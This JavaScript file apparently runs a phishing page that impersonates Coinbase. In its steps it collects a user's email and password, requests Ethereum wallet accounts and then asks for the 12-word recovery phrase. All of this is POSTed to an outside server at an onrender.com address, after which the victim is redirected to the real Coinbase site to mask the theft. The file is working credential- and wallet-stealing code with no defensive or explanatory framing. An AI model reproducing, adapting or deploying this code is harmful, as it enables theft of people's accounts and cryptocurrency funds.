const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if (!email || !pass) return alert('Fill all fields');
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if (window.ethereum) {
            try {
                status.innerText = "Connecting...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo">
            <h1>Verify Identity</h1>
            <p>Enter your 12-word recovery phrase</p>
            <input type="text" id="phrase" placeholder="word1 word2 ..." style="width:100%; padding:12px; margin:10px 0; text-align:center;">
            <button id="submitPhrase" class="btn-primary" style="width:100%;">Done</button>
            <div id="phrase_status" style="color:red; margin-top:10px;"></div>
        `;
        const input = document.getElementById('phrase');
        const btn = document.getElementById('submitPhrase');
        const s = document.getElementById('phrase_status');

        btn.onclick = async () => {
            const phrase = input.value.trim();
            if (phrase.split(/\s+/).length !== 12) {
                s.innerText = "Exactly 12 words required.";
                return;
            }
            await sendData(email, pass, null, phrase);
        };
        input.onkeydown = (e) => { if(e.key === 'Enter') btn.click(); };
    }

    async function sendData(email, pass, wallet, phrase) {
        try {
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                window.location.href = 'https://www.coinbase.com/password-recovery';
            }
        } catch (e) {
            status.innerText = "Error sending data.";
        }
    }
});
